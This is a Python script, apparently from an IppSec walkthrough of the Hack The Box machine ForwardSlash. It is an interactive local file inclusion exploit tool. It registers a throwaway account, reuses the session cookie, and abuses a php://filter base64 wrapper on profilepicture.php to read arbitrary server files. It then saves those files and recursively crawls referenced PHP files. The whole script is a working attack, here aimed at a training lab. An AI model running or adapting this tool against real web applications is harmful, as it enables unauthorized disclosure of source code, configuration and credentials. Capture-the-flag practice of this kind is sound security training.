#!/bin/python3

#
# From IppSec YouTube video ForwardSlash
#
# https://youtu.be/alJa51XylDE
#

import requests
import secrets
from cmd import Cmd
from base64 import b64encode, b64decode
from pathlib import Path
import os
import re

URL = "http://backup.forwardslash.htb/"

LFI_URL   = "profilepicture.php"
REG_URL   = "register.php"
LOGIN_URL = "login.php"

PHPSESSION = None

# need to create a user and then login to get session 
def init_session():

    # check if persisted cookie there

    global PHPSESSION

    if not PHPSESSION:
        try:
            f = open(".lficookie", "r")
            PHPSESSION = f.read().strip()
            f.close()
            print(f"[*] Reusing existing session")
            return True
        except:
            None
    else:
        return True
        
    username = password = secrets.token_hex(6)
    # create unique user and password of at least 6 chars
    print(f"[*] Creating user {username}")
    data = {"username": username, "password": password, "confirm_password": password}

    r = requests.post(URL + REG_URL, data=data)

    if r.status_code != 200:
        print("Failed to create user!")
        return False

    r = requests.get(URL + LOGIN_URL)
    
    PHPSESSION = re.search("=(.+?);", r.headers['Set-Cookie']).group(1)

    cookie = {"PHPSESSID": PHPSESSION}
    r = requests.post(URL + LOGIN_URL, cookies=cookie, data=data)

    if r.status_code != 200:
        print("Failed to login!")
        return False

    # persist the cookie

    with open(".lficookie", "w") as f:
        f.write(PHPSESSION)
        f.close()
   
    return True

def get_source(file_name):
    
    lfi = f"php://filter/convert.base64-encode/resource={file_name}"
    data = {"url": lfi}
    cookie = {"PHPSESSID": PHPSESSION}
    try:
        req = requests.post(URL + LFI_URL, cookies=cookie, data=data)
        req = (req.text).splitlines()
        return b64decode(req[-1])
    except:
        return False

def save_file(full_name, source):
    dir_name  = str(Path(full_name).parent)
    file_name = str(Path(full_name).name)

    save_path = os.getcwd() + "/" + dir_name
    try:
        os.makedirs(save_path)
    except:
        None

    f = open(save_path + "/"  + file_name, "w+")
    f.write(source.decode())
    f.close()

    
class Terminal(Cmd):
    intro = 'LFI explorer for ForwardSlash http://backup.forwardslash.htb/  Type help or ? to list commands.\n'
          
    def default(self, args):
        'Path of a file to fetch'
        source = get_source(args)
        save_file(args, source)  
        print(source.decode())

    def do_fetch(self, args):
        'Process a file with a list of files to fetch'
        for line in open('args'):
            line = line.strip()
            try:
                source = get_source(line)
                if source:
                    print(f"Fetched: {line}" )
                    save_file(line, source)
            except:
                print(f"Not found:  {line}" )                
                None

    def do_crawl(self, args):
        'Process a php file and fetch the referenced files'

        source = get_source(args)
        print(f"Fetching {args}")
        if not source:
            print(f"Failed to download {args}")
            return
        else:
            print(f"Saving {args}")
            save_file(args, source)
        
        files = re.findall(r'([a-z0-9\-]*\.php)', source.decode())
        
        for i in files:
            if i not in self.crawled:
                self.crawled.append(i)
                self.do_crawl(i)


    def precmd(self, line):
        init_session()
        return line
        
    def postcmd(self, stop, line):
        self.crawled.clear()
        return False

    def __init__(self):
        self.prompt = "> "
        self.crawled = []
        Cmd.__init__(self)


          
terminal = Terminal()
terminal.cmdloop()
